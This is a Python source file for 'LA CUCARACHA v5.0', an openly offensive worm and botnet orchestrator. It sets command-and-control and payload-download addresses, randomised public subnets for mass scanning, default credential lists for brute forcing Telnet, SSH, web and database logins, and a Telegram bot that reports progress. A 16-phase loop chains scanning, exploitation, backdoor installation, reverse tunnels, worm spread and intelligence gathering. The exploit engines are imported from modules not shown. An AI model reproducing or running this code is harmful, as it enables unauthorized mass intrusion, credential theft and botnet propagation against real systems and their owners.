#!/usr/bin/env python3
"""
LA CUCARACHA v5.0 — PHOENIX ASCENSION
Full 16-phase IF/THEN decision pipeline
ICMP → TCP → FP → CVE → Web → Embed → Genzai → Enterprise → Brute → Backdoor → Tunnel → Worm → Intel → Sleep → Crossfeed → Report

by🇭🇷PhonkAlphabet
"""

import base64, concurrent.futures, hashlib, hmac, json, logging, os, random, re
import shutil, signal, socket, sqlite3, ssl, subprocess, sys, threading, time
import urllib.parse, urllib.request
from collections import defaultdict, deque
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

log = logging.getLogger("lacucaracha_v5")

VERSION = "5.0"

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(BASE_DIR, "logs")
DB_PATH = os.path.join(BASE_DIR, "worm_mesh_v5.db")
CONFIG_PATH = os.path.join(BASE_DIR, "telegram_config.json")
DB_LOCK = threading.Lock()

# ─── C2 ───
C2_HOST = "127.0.0.1"
C2_PORT = 10001
C2_CALLBACK_PORT = 10001
PAYLOAD_URL = f"http://{C2_HOST}:10004/LaCucaracha.py"

# ─── MASSCAN ───
MASSCAN_RATE = 5000
MASSCAN_WAIT = 3
MASSCAN_PORTS = ",".join([
    "23","22","2222","80","443","8080","8443","7547",
    "3000","5000","7000","8888","9092","9200","9443","9999",
    "3306","5432","27017","6379","5900","3389",
    "161","162","445","139","135","1433","1521","4899",
])

# ─── EMOJI ───
E = {
    "worm":"🐛","skull":"💀","target":"🎯","node":"🖥","success":"✅","fail":"❌",
    "warning":"⚠️","info":"ℹ️","stats":"📊","scan":"🔍","exploit":"💥","deploy":"📦",
    "mesh":"🕸","c2":"📡","alert":"🚨","lock":"🔒","key":"🔑","db":"🗄",
    "cpu":"⚙️","memory":"🧠","network":"🌐","time":"⏰","flag":"🏴","fire":"🔥",
    "shield":"🛡","bot":"🤖","admin":"👑","chart":"📈","rocket":"🚀","gear":"⚙️",
    "crown":"👑","sword":"⚔️","diamond":"💎","star":"⭐","dragon":"🐉","phoenix":"🔥",
    "trophy":"🏆","medal":"🎖","lightning":"⚡","boom":"💥","radioactive":"☢️","biohazard":"☣️",
    "satellite":"📰","radar":"📡","terminal":"🖥","chip":"💻","server":"🗄","cloud":"☁️",
    "firewall":"🧱","backdoor":"🚪","shell":"🐚","root":"🌱","refresh":"🔄",
    "telnet":"🔐","web":"🌐","ssh":"🔑","rdp":"🖥","vnc":"🖼","heartbeat":"💓","error":"🔥",
    "queue":"📋","batch":"📊","cred":"🔑","uptime":"⏱","report":"📊","summary":"📈",
    "decision":"🧠","sleep":"💤","hunt":"🐾","pwn":"🏆","alive":"✅","dead":"❌",
    "timeout":"⏱","retry":"🔁","phase":"🎯","icmp":"📡","tcp":"🔍","fp":"🖥",
    "cve":"🧨","embed":"⚙️","genzai":"🧟","enterprise":"🏢","brute":"🔑",
    "firewall":"🛡","tunnel":"🔌","intel":"🧠","crossfeed":"🔄",
}
EMOJI = E

# ─── SERVICE MAPS ───
SERVICE_PRIORITY = {
    23:100, 7547:95, 80:85, 443:84, 8080:83, 8443:82,
    3000:80, 5000:79, 7000:78, 8888:77, 9092:76, 9200:75,
    9443:74, 9999:73, 3306:60, 5432:59, 27017:58, 6379:57,
    5900:40, 3389:39, 22:10, 2222:9, 445:50, 139:48, 135:45,
    1433:55, 1521:54, 4899:35, 161:30, 162:29,
}
SERVICE_EMOJI = {
    23:"🔐", 22:"🔑", 2222:"🔑", 80:"🌐", 443:"🌐", 8080:"🌐", 8443:"🌐",
    3000:"🌐", 5000:"🌐", 7000:"🌐", 8888:"🌐", 3306:"🗄", 5432:"🗄", 27017:"🗄", 6379:"🗄",
    7547:"📡", 5900:"🖼", 3389:"🖥", 445:"🏢", 139:"🏢", 1433:"🗄", 1521:"🗄",
}
SERVICE_NAME = {
    23:"Telnet", 22:"SSH", 2222:"SSH-ALT", 80:"HTTP", 443:"HTTPS", 8080:"HTTP-ALT",
    8443:"HTTPS-ALT", 3000:"Gitea/Node", 5000:"Flask/Django", 7000:"Spring/Java",
    8888:"Jupyter/Webmin", 3306:"MySQL", 5432:"PostgreSQL", 27017:"MongoDB",
    6379:"Redis", 7547:"TR-069", 5900:"VNC", 3389:"RDP", 9092:"Kafka",
    9200:"Elasticsearch", 9443:"HTTPS-ALT", 9999:"Monitoring",
    445:"SMB", 139:"NetBIOS", 1433:"MSSQL", 1521:"Oracle",
    4899:"RAdmin", 161:"SNMP", 162:"SNMP-Trap",
}

BOX_SEP = "╠" + "═"*22 + "╣"

# ═════════════════════════════════════════════════════════════════════
# SPIDER SUBNETS
# ═════════════════════════════════════════════════════════════════════
random.seed()
SPIDER_SUBNETS = []
for oct in range(0, 256):
    for base in ["159.89","159.223","167.71","137.184","143.110","157.230",
                  "138.68","165.22","128.199","178.128","188.166","206.189",
                  "46.101","159.65","104.248","49.12","65.21","95.217"]:
        SPIDER_SUBNETS.append(f"{base}.{oct}.0/24")
SPIDER_SUBNETS += [f"103.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(500)]
SPIDER_SUBNETS += [f"41.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"89.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"91.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"95.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"185.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(300)]
SPIDER_SUBNETS += [f"31.{random.randint(0,255)}.{random.randint(0,255)}.0/24" for _ in range(200)]
SPIDER_SUBNETS += [f"45.{random.randint(0,128)}.{random.randint(0,255)}.0/24" for _ in range(200)]

# ─── CREDENTIAL DATABASES ───
TELNET_CREDS = [
    ("root",""), ("root","root"), ("root","admin"), ("root","1234"),
    ("root","xc3511"), ("root","vizxv"), ("root","Zte521"), ("root","anko"),
    ("root","realtek"), ("root","default"), ("root","pass"), ("root","12345"),
    ("root","54321"), ("root","7ujMko0vizxv"), ("root","system"),
    ("admin",""), ("admin","admin"), ("admin","1234"), ("admin","password"),
    ("admin","12345"), ("admin","123456"), ("admin","1111"), ("admin","1111111"),
    ("admin","123456789"), ("service","service"), ("user","user"), ("guest","guest"),
    ("support","support"), ("ubnt","ubnt"), ("cisco","cisco"), ("super","super"),
    ("Admin","12345"), ("Admin","admin"), ("root","hi3518"), ("root","jvbzd"),
    ("root","osminox"), ("root","dreambox"), ("root","samsung"),
    ("admin","meinsm"), ("admin","tlJwpbo6"), ("admin","Zte521"), ("admin","pass"),
    ("admin","default"), ("root","12345678"), ("admin","12345678"),
    ("admin","admin123"), ("admin","p@ssw0rd"), ("root","P@ssw0rd"),
    ("admin","changeme"), ("root","changeme"), ("admin","letmein"),
    ("-froot",""), ("\x00root",""), ("\x00admin",""),
]
WEB_CREDS = TELNET_CREDS + [
    ("admin","admin123"), ("admin","password123"), ("admin","letmein"),
    ("admin","changeme"), ("admin","passw0rd"), ("admin","qwerty"),
    ("admin","12345678"), ("admin","P@ssw0rd"), ("root","P@ssw0rd"),
    ("admin","administrator"), ("admin","default"), ("admin","temp123"),
    ("admin","test123"), ("Administrator","password"), ("admin","demo"),
    ("admin","test"), ("admin","root"), ("root","toor"), ("admin","123456"),
    ("root","123456"), ("admin","password"), ("root","password"),
]
DB_CREDS = [
    ("root",""), ("root","root"), ("root","password"), ("root","admin"),
    ("root","123456"), ("root","P@ssw0rd"), ("admin",""), ("admin","admin"),
    ("admin","password"), ("postgres",""), ("postgres","postgres"),
    ("mongodb",""), ("mongodb","mongodb"), ("redis",""), ("redis","redis"),
]
SSH_CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("root","P@ssw0rd"), ("root","toor"), ("root","qwerty"),
    ("root","1"), ("root","1234"), ("root","changeme"), ("root","letmein"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("admin","admin123"), ("admin","P@ssw0rd"), ("admin","passw0rd"),
]

# ═════════════════════════════════════════════════════════════════════
# TELEGRAM REPORTER (v5 — enhanced)
# ═════════════════════════════════════════════════════════════════════
class TelegramReporter:
    """Async batched Telegram reporter with per-phase decision hooks."""

    def __init__(self, token: str, admin_ids: List[int] = None,
                 dry_run: bool = False, chat_id: int = None):
        self.token = token
        self.admin_ids = admin_ids or [0, 0]
        self.chat_id = chat_id or 0
        self.dry_run = dry_run
        self._stop = False
        self._queue: deque = deque()
        self._batch: List[str] = []
        self._batch_lock = threading.RLock()
        self._batch_last_flush = time.time()
        self._send_count = 0
        self._drop_count = 0
        self._short_count = 0
        self._flusher_thread = threading.Thread(target=self._periodic_batch_flusher, daemon=True)
        self._flusher_thread.start()

    def _periodic_batch_flusher(self) -> None:
        while not self._stop:
            time.sleep(2.5)
            self._flush_short_batch()

    def _flush_short_batch(self) -> None:
        with self._batch_lock:
            if not self._batch:
                return
            batch = self._batch[:]
            self._batch.clear()
            self._batch_last_flush = time.time()
        text = "\n".join(batch)
        self._send(text)

    def _send(self, text: str) -> bool:
        if self.dry_run or not self.token:
            return False
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            data = json.dumps({
                "chat_id": self.chat_id,
                "text": text[:4096],
                "parse_mode": "HTML",
            }).encode()
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{self.token}/sendMessage",
                data=data, method="POST",
                headers={"Content-Type": "application/json"},
            )
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            resp.close()
            self._send_count += 1
            return True
        except Exception:
            self._drop_count += 1
            return False

    def short(self, action: str, target: str, status: str, detail: str = "") -> None:
        """Non-blocking short status line — batched."""
        emoji = EMOJI.get(action.lower(), EMOJI.get(status.lower(), "•"))
        line = f"{emoji} <b>{action}</b> {target} — {status}"
        if detail:
            line += f" | {detail}"
        with self._batch_lock:
            self._batch.append(line)
            self._short_count += 1
            if len(self._batch) >= 8:
                self._flush_short_batch()

    def decision(self, if_condition: str, then_action: str, target: str = "") -> None:
        line = f"🧠 <b>IF</b> {if_condition} <b>→ THEN</b> {then_action}"
        if target:
            line += f" ({target})"
        with self._batch_lock:
            self._batch.append(line)
            self._short_count += 1
            if len(self._batch) >= 8:
                self._flush_short_batch()

    def msg(self, title: str, lines: List[str]) -> None:
        """Full box message (immediate)."""
        text = f"<b>{title}</b>\n" + "\n".join(lines)
        self._send(text)

    def phase_report(self, phase: str, data: Dict) -> None:
        emoji = EMOJI.get(phase.lower(), "🎯")
        lines = [f"{emoji} <b>PHASE: {phase.upper()}</b>"]
        for k, v in data.items():
            lines.append(f"  ▸ {k}: {v}")
        self._send("\n".join(lines))

    def raw(self, text: str) -> None:
        self._send(text)

    def flush(self, timeout: float = 10.0) -> int:
        self._flush_short_batch()
        return len(self._batch)

    def stats(self) -> Dict:
        return {"sent": self._send_count, "dropped": self._drop_count, "short": self._short_count}


# ═════════════════════════════════════════════════════════════════════
# SMART DB (v5 — schema extended for 16-phase tracking)
# ═════════════════════════════════════════════════════════════════════
class SmartDB:
    """Persistent SQLite DB with extended schema for all 16 phases."""

    def __init__(self, path: str = DB_PATH):
        self.path = path
        self._conn: Optional[sqlite3.Connection] = None
        self._connect()
        self._ensure_schema()

    def _connect(self) -> None:
        self._conn = sqlite3.connect(self.path, check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        self._conn.execute("PRAGMA journal_mode=WAL")
        self._conn.execute("PRAGMA synchronous=NORMAL")
        self._conn.execute("PRAGMA busy_timeout=5000")

    def _ensure_schema(self) -> None:
        self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                port INTEGER NOT NULL,
                protocol TEXT DEFAULT 'tcp',
                first_seen TEXT DEFAULT (datetime('now')),
                last_seen TEXT DEFAULT (datetime('now')),
                fp_os TEXT DEFAULT '',
                fp_banner TEXT DEFAULT '',
                fp_service TEXT DEFAULT '',
                fp_ttl INTEGER DEFAULT 0,
                fp_http_server TEXT DEFAULT '',
                icmp_alive INTEGER DEFAULT 0,
                tcp_open INTEGER DEFAULT 1,
                cve_scanned INTEGER DEFAULT 0,
                cve_vulns TEXT DEFAULT '',
                web_pwned INTEGER DEFAULT 0,
                embed_pwned INTEGER DEFAULT 0,
                genzai_merged INTEGER DEFAULT 0,
                enterprise_pwned INTEGER DEFAULT 0,
                brute_pwned INTEGER DEFAULT 0,
                backdoor_installed INTEGER DEFAULT 0,
                tunnel_active INTEGER DEFAULT 0,
                worm_deployed INTEGER DEFAULT 0,
                intel_collected INTEGER DEFAULT 0,
                crossfeed_count INTEGER DEFAULT 0,
                UNIQUE(ip, port)
            );
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT, port INTEGER, service TEXT,
                username TEXT, password TEXT,
                source TEXT DEFAULT 'manual',
                first_seen TEXT DEFAULT (datetime('now')),
                last_used TEXT DEFAULT (datetime('now')),
                valid INTEGER DEFAULT 1,
                UNIQUE(ip, port, username, password)
            );
            CREATE TABLE IF NOT EXISTS intel_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT, port INTEGER,
                intel_type TEXT, intel_data TEXT,
                collected_at TEXT DEFAULT (datetime('now'))
            );
            CREATE TABLE IF NOT EXISTS worm_mesh (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                node_ip TEXT UNIQUE,
                node_port INTEGER DEFAULT 10002,
                peer_ips TEXT DEFAULT '',
                first_seen TEXT DEFAULT (datetime('now')),
                last_heartbeat TEXT DEFAULT (datetime('now')),
                version TEXT DEFAULT '5.0',
                active INTEGER DEFAULT 1
            );
            CREATE INDEX IF NOT EXISTS idx_targets_ip ON targets(ip);
            CREATE INDEX IF NOT EXISTS idx_creds_ip ON credentials(ip);
            CREATE INDEX IF NOT EXISTS idx_intel_ip ON intel_log(ip);
        """)

    def q(self, sql: str, params: tuple = ()) -> Optional[List[Dict]]:
        try:
            cur = self._conn.execute(sql, params)
            rows = cur.fetchall()
            return [dict(r) for r in rows] if rows else []
        except sqlite3.OperationalError:
            self._recover()
            return []

    def _recover(self) -> None:
        try:
            self._conn.close()
        except Exception:
            pass
        self._connect()

    def stats(self) -> Dict[str, int]:
        return {"targets": self.q("SELECT COUNT(*) as c FROM targets")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets") else 0,
                "exploited": self.q("SELECT COUNT(*) as c FROM targets WHERE brute_pwned=1 OR web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE brute_pwned=1 OR web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1") else 0,
                "credentials": self.q("SELECT COUNT(*) as c FROM credentials")[0]["c"] if self.q("SELECT COUNT(*) as c FROM credentials") else 0,
                "worm_nodes": self.q("SELECT COUNT(*) as c FROM worm_mesh WHERE active=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM worm_mesh WHERE active=1") else 0,
                "backdoors": self.q("SELECT COUNT(*) as c FROM targets WHERE backdoor_installed=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE backdoor_installed=1") else 0,
                "tunnels": self.q("SELECT COUNT(*) as c FROM targets WHERE tunnel_active=1")[0]["c"] if self.q("SELECT COUNT(*) as c FROM targets WHERE tunnel_active=1") else 0,
                "intel_logs": self.q("SELECT COUNT(*) as c FROM intel_log")[0]["c"] if self.q("SELECT COUNT(*) as c FROM intel_log") else 0}

    def port_breakdown(self) -> List[Dict]:
        rows = self.q("SELECT port, COUNT(*) as c FROM targets GROUP BY port ORDER BY c DESC LIMIT 10")
        return rows or []

    def add_target(self, ip: str, port: int, protocol: str = "tcp",
                   fp_data: Dict = None) -> None:
        self.q("INSERT OR IGNORE INTO targets (ip, port, protocol) VALUES (?, ?, ?)",
               (ip, port, protocol))
        if fp_data:
            self.q("""UPDATE targets SET fp_os=?, fp_banner=?, fp_service=?,
                      fp_ttl=?, fp_http_server=?, icmp_alive=?, tcp_open=1
                      WHERE ip=? AND port=?""",
                   (fp_data.get("os",""), fp_data.get("banner",""),
                    fp_data.get("service",""), fp_data.get("ttl",0),
                    fp_data.get("http_server",""), fp_data.get("icmp_alive",0),
                    ip, port))

    def get_unexploited(self, limit: int = 200) -> List[Dict]:
        return self.q("""SELECT * FROM targets WHERE
            brute_pwned=0 AND web_pwned=0 AND embed_pwned=0 AND enterprise_pwned=0
            AND cve_vulns='' AND tcp_open=1
            ORDER BY first_seen ASC LIMIT ?""", (limit,)) or []

    def get_pwned_no_deploy(self, limit: int = 100) -> List[Dict]:
        return self.q("""SELECT * FROM targets WHERE
            (brute_pwned=1 OR web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1 OR cve_vulns!='')
            AND backdoor_installed=0 AND worm_deployed=0
            ORDER BY last_seen ASC LIMIT ?""", (limit,)) or []

    def get_pwned_no_backdoor(self, limit: int = 100) -> List[Dict]:
        return self.q("""SELECT * FROM targets WHERE
            (brute_pwned=1 OR web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1)
            AND backdoor_installed=0
            ORDER BY last_seen ASC LIMIT ?""", (limit,)) or []

    def get_backdoor_no_tunnel(self, limit: int = 100) -> List[Dict]:
        return self.q("""SELECT * FROM targets WHERE
            backdoor_installed=1 AND tunnel_active=0
            ORDER BY last_seen ASC LIMIT ?""", (limit,)) or []

    def get_pwned_no_worm(self, limit: int = 100) -> List[Dict]:
        return self.q("""SELECT * FROM targets WHERE
            backdoor_installed=1 AND worm_deployed=0 AND tunnel_active=1
            ORDER BY last_seen ASC LIMIT ?""", (limit,)) or []

    def get_intel_targets(self, limit: int = 100) -> List[Dict]:
        return self.q("""SELECT * FROM targets WHERE
            worm_deployed=1 AND intel_collected=0
            ORDER BY last_seen ASC LIMIT ?""", (limit,)) or []

    def mark_pwned(self, ip: str, port: int, field: str, user: str = "", pwd: str = "") -> None:
        safe_fields = ["brute_pwned","web_pwned","embed_pwned","enterprise_pwned",
                       "backdoor_installed","tunnel_active","worm_deployed","intel_collected"]
        if field in safe_fields:
            self.q(f"UPDATE targets SET {field}=1 WHERE ip=? AND port=?", (ip, port))
        if user or pwd:
            # Determine service name from port
            svc = SERVICE_NAME.get(port, f"p{port}")
            self.q("""INSERT OR IGNORE INTO credentials (ip, port, service, username, password, source)
                      VALUES (?, ?, ?, ?, ?, ?)""", (ip, port, svc, user, pwd, field))

    def mark_cve(self, ip: str, port: int, vulns: str) -> None:
        self.q("UPDATE targets SET cve_scanned=1, cve_vulns=? WHERE ip=? AND port=?",
               (vulns, ip, port))

    def mark_fp(self, ip: str, port: int, fp: Dict) -> None:
        self.q("""UPDATE targets SET fp_os=?, fp_banner=?, fp_service=?,
                  fp_ttl=?, fp_http_server=?, icmp_alive=?
                  WHERE ip=? AND port=?""",
               (fp.get("os",""), fp.get("banner",""), fp.get("service",""),
                fp.get("ttl",0), fp.get("http_server",""), fp.get("icmp_alive",0),
                ip, port))

    def log_intel(self, ip: str, port: int, intel_type: str, intel_data: str) -> None:
        self.q("INSERT INTO intel_log (ip, port, intel_type, intel_data) VALUES (?, ?, ?, ?)",
               (ip, port, intel_type, intel_data))
        self.q("UPDATE targets SET intel_collected=intel_collected+1 WHERE ip=? AND port=?",
               (ip, port))

    def close(self) -> None:
        try:
            self._conn.close()
        except Exception:
            pass


# ═════════════════════════════════════════════════════════════════════
# EMBEDDED ENGINE FILES — imported from phases/ modules
# ═════════════════════════════════════════════════════════════════════
# The following engine modules are loaded dynamically:
#   phases/discovery_engine.py  — ICMP, TCP, FP phases
#   phases/exploit_engine.py    — CVE, Web, Embed, Genzai, Enterprise, Brute phases
#   phases/deploy_intel_engine.py — Backdoor, Tunnel, Worm, Intel, Crossfeed, Report phases
# ═════════════════════════════════════════════════════════════════════

sys.path.insert(0, BASE_DIR)
from phases.discovery_engine import DiscoveryEngine
from phases.exploit_engine import ExploitEngine
from phases.deploy_intel_engine import DeployIntelEngine


# ═════════════════════════════════════════════════════════════════════
# DECISION ENGINE v5 — Full 16-phase IF/THEN
# ═════════════════════════════════════════════════════════════════════
class DecisionEngineV5:
    """16-phase decision engine. Each phase returns the NEXT phase name."""

    # Phase order
    PHASES = [
        "ICMP", "TCP", "FP", "NIL", "CVE", "WEB", "EMBED", "GENZAI",
        "ENTERPRISE", "BRUTE", "BACKDOOR", "TUNNEL", "WORM",
        "INTEL", "SLEEP", "CROSSFEED", "REPORT",
    ]

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self.stats: Dict = {}
        self._hit_streak = 0
        self._empty_streak = 0
        self._phase_index = 0  # current position in PHASES order
        self._last_decision = "INIT"
        self._phase_counts = {p: 0 for p in self.PHASES}
        self._skip_icmp = False
        self._skip_fp = False

    def decide(self, phase: str, result: Dict) -> str:
        count = result.get("count", 0)
        success = result.get("success", False)
        targets = result.get("targets", [])

        if count > 0 or success:
            self._hit_streak += 1
            self._empty_streak = 0
        else:
            self._empty_streak += 1
            self._hit_streak = 0

        self._phase_counts[phase] = self._phase_counts.get(phase, 0) + 1

        # ─── ICMP ──────────────────────────────────────────────
        if phase == "ICMP":
            if count > 0:
                self.r.decision(f"{count} hosts alive", "TCP scan", f"{len(targets)} targets")
                self._last_decision = f"ICMP: {count} alive → TCP"
                self._skip_icmp = True
                return "TCP"
            else:
                self.r.decision("no ICMP response", "RETRY ICMP", "next range")
                self._last_decision = "ICMP: empty → RETRY"
                return "ICMP"

        # ─── TCP ──────────────────────────────────────────────
        elif phase == "TCP":
            if count > 0:
                self.r.decision(f"{count} open ports", "FP scan", f"{len(targets)} targets")
                self._last_decision = f"TCP: {count} open → FP"
                return "FP"
            elif self._empty_streak >= 2:
                self.r.decision(f"{self._empty_streak}x empty TCP", "ICMP fresh range", "rotate")
                self._last_decision = f"TCP: empty → ICMP rotate"
                self._skip_icmp = False
                return "ICMP"
            else:
                self.r.decision("no TCP open", "RETRY TCP", "same range")
                self._last_decision = "TCP: empty → RETRY"
                return "TCP"

        # ─── FP ───────────────────────────────────────────────
        elif phase == "FP":
            if count > 0:
                self.r.decision(f"{count} fingerprinted", "NIL probe", f"{len(targets)} targets")
                self._last_decision = f"FP: {count} done → NIL"
                return "NIL"
            else:
                self.r.decision("no FP data", "NIL probe", "try nil uuid bypass")
                self._last_decision = "FP: skip → NIL"
                return "NIL"

        # ─── CVE ──────────────────────────────────────────────
        elif phase == "CVE":
            if count > 0:
                self.r.decision(f"{count} CVEs found", "WEB exploit", f"{count} vulnerable")
                self._last_decision = f"CVE: {count} → WEB"
                return "WEB"
            elif self._hit_streak > 2:
                self.r.decision("CVE hit streak", "WEB anyway", "momentum")
                self._last_decision = "CVE: streak → WEB"
                return "WEB"
            else:
                self.r.decision("no CVE hits", "WEB fallback", "creds spray")
                self._last_decision = "CVE: none → WEB"
                return "WEB"

        # ─── NIL ──────────────────────────────────────────────
        elif phase == "NIL":
            if count > 0:
                self.r.decision(f"{count} nil pwned", "CVE scan", f"nil bypasses found")
                self._last_decision = f"NIL: {count} → CVE"
                self._hit_streak += 1
                return "CVE"
            else:
                self.r.decision("no nil hits", "CVE anyway", "continue normal chain")
                self._last_decision = "NIL: none → CVE"
                return "CVE"

        # ─── WEB ──────────────────────────────────────────────
        elif phase == "WEB":
            if count > 0:
                self.r.decision(f"{count} web pwned", "EMBED", "IoT exploits")
                self._last_decision = f"WEB: {count} → EMBED"
                return "EMBED"
            elif self.stats.get("telnet_live", 0) > 0 or self.stats.get("web_live", 0) > 0:
                self.r.decision("live but no pwn", "RETRY WEB expanded", "more creds")
                self._last_decision = "WEB: live → RETRY"
                return "WEB"
            else:
                self.r.decision("no web pwn", "EMBED anyway", "EmbedXPL")
                self._last_decision = "WEB: none → EMBED"
                return "EMBED"

        # ─── EMBED ────────────────────────────────────────────
        elif phase == "EMBED":
            if count > 0:
                self.r.decision(f"{count} embed pwned", "GENZAI merge", "IoT creds")
                self._last_decision = f"EMBED: {count} → GENZAI"
                return "GENZAI"
            else:
                self.r.decision("no embed pwn", "GENZAI anyway", "merge all creds")
                self._last_decision = "EMBED: none → GENZAI"
                return "GENZAI"

        # ─── GENZAI ───────────────────────────────────────────
        elif phase == "GENZAI":
            if count > 0:
                self.r.decision(f"{count} Genzai merged", "ENTERPRISE", "enterprise vectors")
                self._last_decision = f"GENZAI: {count} → ENTERPRISE"
                return "ENTERPRISE"
            else:
                self.r.decision("no Genzai", "ENTERPRISE direct", "skip genzai")
                self._last_decision = "GENZAI: skip → ENTERPRISE"
                return "ENTERPRISE"

        # ─── ENTERPRISE ───────────────────────────────────────
        elif phase == "ENTERPRISE":
            if count > 0:
                self.r.decision(f"{count} enterprise pwned", "BRUTE", "mass cred spray")
                self._last_decision = f"ENTERPRISE: {count} → BRUTE"
                return "BRUTE"
            else:
                self.r.decision("no enterprise", "BRUTE direct", "bruteforce remaining")
                self._last_decision = "ENTERPRISE: none → BRUTE"
                return "BRUTE"

        # ─── BRUTE ────────────────────────────────────────────
        elif phase == "BRUTE":
            if count > 0:
                self.r.decision(f"{count} brute pwned", "BACKDOOR", "install persistence")
                self._last_decision = f"BRUTE: {count} → BACKDOOR"
                return "BACKDOOR"
            else:
                self.r.decision("no brute", "BACKDOOR skip", "no new pwns")
                self._last_decision = "BRUTE: none → BACKDOOR"
                return "BACKDOOR"

        # ─── BACKDOOR ─────────────────────────────────────────
        elif phase == "BACKDOOR":
            if count > 0:
                self.r.decision(f"{count} backdoored", "TUNNEL", "reverse tunnel")
                self._last_decision = f"BACKDOOR: {count} → TUNNEL"
                return "TUNNEL"
            else:
                self.r.decision("no backdoor", "TUNNEL skip", "try tunnel anyway")
                self._last_decision = "BACKDOOR: none → TUNNEL"
                return "TUNNEL"

        # ─── TUNNEL ───────────────────────────────────────────
        elif phase == "TUNNEL":
            if count > 0:
                self.r.decision(f"{count} tunneled", "WORM", "propagate worm")
                self._last_decision = f"TUNNEL: {count} → WORM"
                return "WORM"
            else:
                self.r.decision("no tunnel", "WORM anyway", "direct worm deploy")
                self._last_decision = "TUNNEL: none → WORM"
                return "WORM"

        # ─── WORM ─────────────────────────────────────────────
        elif phase == "WORM":
            if count > 0:
                self.r.decision(f"{count} worm deployed", "INTEL", "gather intelligence")
                self._last_decision = f"WORM: {count} → INTEL"
                return "INTEL"
            else:
                self.r.decision("no worm deploy", "INTEL anyway", "passive intel")
                self._last_decision = "WORM: none → INTEL"
                return "INTEL"

        # ─── INTEL ────────────────────────────────────────────
        elif phase == "INTEL":
            if count > 0:
                self.r.decision(f"{count} intel logs", "SLEEP", "rest before next epoch")
                self._last_decision = f"INTEL: {count} → SLEEP"
                return "SLEEP"
            else:
                self.r.decision("no intel", "SLEEP", "rest")
                self._last_decision = "INTEL: none → SLEEP"
                return "SLEEP"

        # ─── SLEEP ────────────────────────────────────────────
        elif phase == "SLEEP":
            if self._hit_streak > 5:
                self.r.decision(f"hot ({self._hit_streak})", "SHORT SLEEP", "5s")
                dur = 5
            elif self._empty_streak > 5:
                self.r.decision(f"cold ({self._empty_streak})", "LONG SLEEP", "30s")
                dur = 30
            else:
                self.r.decision("standard", "NORMAL SLEEP", "10s")
                dur = 10
            result["sleep_duration"] = dur
            self._last_decision = f"SLEEP: {dur}s → CROSSFEED"
            return "CROSSFEED"

        # ─── CROSSFEED ────────────────────────────────────────
        elif phase == "CROSSFEED":
            if count > 0:
                self.r.decision(f"{count} crossfeed ops", "REPORT", "generate intel report")
                self._last_decision = f"CROSSFEED: {count} → REPORT"
                return "REPORT"
            else:
                self.r.decision("no crossfeed", "REPORT direct", "epoch summary")
                self._last_decision = "CROSSFEED: none → REPORT"
                return "REPORT"

        # ─── REPORT ───────────────────────────────────────────
        elif phase == "REPORT":
            self.r.decision("epoch complete", "ICMP loop", "fresh cycle")
            self._last_decision = "REPORT: done → ICMP"
            self._skip_icmp = False
            return "ICMP"

        self.r.decision(f"unknown {phase}", "RESET to ICMP", "fallback")
        return "ICMP"

    def get_decision_summary(self) -> str:
        return self._last_decision or "No decisions yet"


# ═════════════════════════════════════════════════════════════════════
# SMART ORCHESTRATOR v5 — 16-Phase Main Loop
# ═════════════════════════════════════════════════════════════════════
class SmartOrchestratorV5:
    """Master orchestrator — 16-phase pipeline with parallel engines."""

    def __init__(self, reporter: TelegramReporter, db: SmartDB):
        self.r = reporter
        self.db = db
        self.epoch = 0
        self._start_time = time.time()
        self._stop = False
        self._phase = "ICMP"
        self._phase_start = time.time()
        self._min_phase = 1.0

        # Thread pools
        self._exploit_pool = concurrent.futures.ThreadPoolExecutor(max_workers=30)
        self._scan_pool = concurrent.futures.ThreadPoolExecutor(max_workers=10)

        # Phase engine modules
        self.discovery = DiscoveryEngine(reporter, db, self._scan_pool)
        self.exploit = ExploitEngine(reporter, db, self._exploit_pool)
        self.deploy_intel = DeployIntelEngine(reporter, db, self._exploit_pool)

        # Decision engine
        self.decision = DecisionEngineV5(reporter, db)

        # Stats
        self.stats = {
            "epochs": 0, "icmp_alive": 0, "tcp_open": 0, "fp_done": 0,
            "cve_found": 0, "web_pwned": 0, "embed_pwned": 0, "genzai_merged": 0,
            "enterprise_pwned": 0, "brute_pwned": 0, "backdoor_installed": 0,
            "tunnel_active": 0, "worm_deployed": 0, "intel_collected": 0,
            "crossfeed_ops": 0, "reports_generated": 0,
        }
        self._pwned_this_epoch: List[Dict] = []

    def stop(self):
        self._stop = True
        self._exploit_pool.shutdown(wait=False)
        self._scan_pool.shutdown(wait=False)

    # ⏱ Phase timeout map — network-heavy phases get a hard cap
